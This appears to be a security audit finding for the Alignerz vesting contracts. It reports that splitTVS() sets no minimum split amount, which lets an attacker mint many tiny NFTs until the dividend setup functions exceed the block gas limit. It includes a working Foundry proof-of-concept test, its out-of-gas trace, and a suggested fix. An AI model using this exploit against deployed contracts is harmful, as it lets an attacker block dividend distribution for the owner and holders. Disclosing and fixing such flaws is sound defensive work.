# [000863] Unbounded NFT Minting Enables Out-of-Gas DoS on Dividend Configuration
  
  ### Summary

When the owner calls `setAmounts()` or `setUpTheDividends()`, execution eventually reaches `getTotalUnclaimedAmounts()`, which iterates over all minted NFTs. Because the protocol enforces no minimum amount during `splitTVS()`, an attacker can repeatedly split a position into hundreds or thousands of near-zero-value fragments. Each split mints additional NFTs that are never burned. This artificially inflates the NFT supply and causes `getTotalUnclaimedAmounts()` to perform an unbounded loop, eventually exceeding the block gas limit and reverting. As a result, the owner cannot initialize or update dividend distributions.

### Root Cause

The protocol does not impose a minimum amount when [splitting a TVS](https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L1086-L1092), allowing an attacker to mint arbitrarily many NFTs by repeatedly performing splits that generate tiny allocation entries. These NFTs accumulate permanently, and since `getTotalUnclaimedAmounts()` iterates over the full range of minted token IDs, the function performs an unbounded loop and ultimately reverts due to out-of-gas conditions. This design flaw allows a malicious user to DoS all dividend-related operations.

### Internal Pre-conditions

None

### External Pre-conditions

None

### Attack Path

1. A malicious user calls splitTVS() multiple times, passing very slow percentages for each desired nft
2. The owner of the A26ZDividendDistributor contract tries to call setAmounts() but will fail due to the OOG error.

### Impact

- Owner cannot configure dividend distribution.
- Dividends cannot be initialized or updated, breaking core functionality of the A26ZDividendDistributor contract.

### PoC

Add this test to the `AlignerzVestingProtocolTest.t.sol` and run it via:
`forge test --mt testDosForDividendsInfineNFTId -vvvv`

```solidity
function testDosForDividendsInfineNFTId() public {
        vm.startPrank(projectCreator);
        vesting.setVestingPeriodDivisor(1);

        // 1. Launch project
        vm.startPrank(projectCreator);
        vesting.launchBiddingProject(address(token), address(usdt), block.timestamp, block.timestamp + 1_000_000, "0x0", true);

        // 2. Create multiple pools with different prices
        vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.01 ether, true);
        vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.02 ether, false);
        vesting.createPool(PROJECT_ID, 4_000_000 ether, 0.03 ether, false);

        vesting.addUsersToWhitelist(bidders, PROJECT_ID);
        vm.stopPrank();
        for (uint256 i = 0; i < NUM_BIDDERS; i++) {
            vm.startPrank(bidders[i]);

            // Approve and place bid
            usdt.approve(address(vesting), BIDDER_USD);

            // Different vesting periods to test variety
            uint256 vestingPeriod = (i % 3 == 0) ? 90 days : (i % 3 == 1) ? 180 days : 365 days;

            vesting.placeBid(PROJECT_ID, BIDDER_USD, vestingPeriod);
            vm.stopPrank();
        }

         // 5. Prepare bid allocations (this would be done off-chain)
        BidInfo[] memory allBids = new BidInfo[](NUM_BIDDERS);

        // Simulate off-chain allocation process
        for (uint256 i = 0; i < NUM_BIDDERS; i++) {
            // Assign bids to pools (in reality, this would be based on some algorithm)
            uint256 poolId = i % 3;
            bool accepted = i < 15; // First 15 bidders are accepted

            allBids[i] = BidInfo({
                bidder: bidders[i],
                amount: BIDDER_USD, // For simplicity, all bids are the same amount
                vestingPeriod: (i % 3 == 0) ? 90 days : (i % 3 == 1) ? 180 days : 365 days,
                poolId: poolId,
                accepted: accepted
            });
        }

        // 6. Generate merkle roots for each pool
        bytes32[] memory poolRoots = new bytes32[](3);
        for (uint256 poolId = 0; poolId < 3; poolId++) {
            poolRoots[poolId] = generateMerkleProofs(allBids, poolId);
        }

        // 7. Generate refund proofs
        refundRoot = generateRefundProofs(allBids);

        // 8. Finalize project with merkle roots
        vm.prank(projectCreator);
        vesting.finalizeBids(PROJECT_ID, refundRoot, poolRoots, 60);
        uint256[] memory nftIds = new uint256[](15);
        // uint256[] memory newNfts;
        address bidder = bidders[0];
        uint256 poolId = bidderPoolIds[bidder];
        vm.prank(bidder);
        uint256 nftId = vesting.claimNFT(PROJECT_ID, poolId, BIDDER_USD, bidderProofs[bidder]);
        nftIds[0] = nftId;
        uint256[] memory percentages = new uint256[](250);
        for (uint8 i = 0; i < 250; i++)
        {
            percentages[i] = 40;
        }
        for (uint8 i = 0; i < 8; i++)
        {
            vm.prank(bidder);
            (uint256 oldNft, uint256[] memory newNfts) = vesting.splitTVS(PROJECT_ID, percentages, nftId);
        }

        // vm.prank(bidder);
        // (uint256 oldNft2, uint256[] memory newNfts2) = vesting.splitTVS(PROJECT_ID, percentages, nftId);
        
        
        vm.prank(projectCreator);
        distributor.setAmounts();

    }
```

Which will get the following results:
```bash
ERC1967Proxy::fallback(1538) [staticcall]
    │   │   ├─ [5795] AlignerzVesting::allocationOfGetter(1538) [delegatecall]
    │   │   │   └─ ← [OutOfGas] EvmError: OutOfGas
    │   │   └─ ← [Revert] EvmError: Revert
    │   └─ ← [Revert] EvmError: Revert
    └─ ← [Revert] EvmError: Revert

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.90s (393.62ms CPU time)

Ran 1 test suite in 4.40s (1.90s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/AlignerzVestingProtocolTest.t.sol:AlignerzVestingProtocolTest
[FAIL: EvmError: Revert] testDosForDividendsInfineNFTId()
```

### Mitigation

Enforce a minimum allocation amount when minting new NFTs during splitTVS(). If the split results in an amount below this threshold, the NFT should not be minted.
  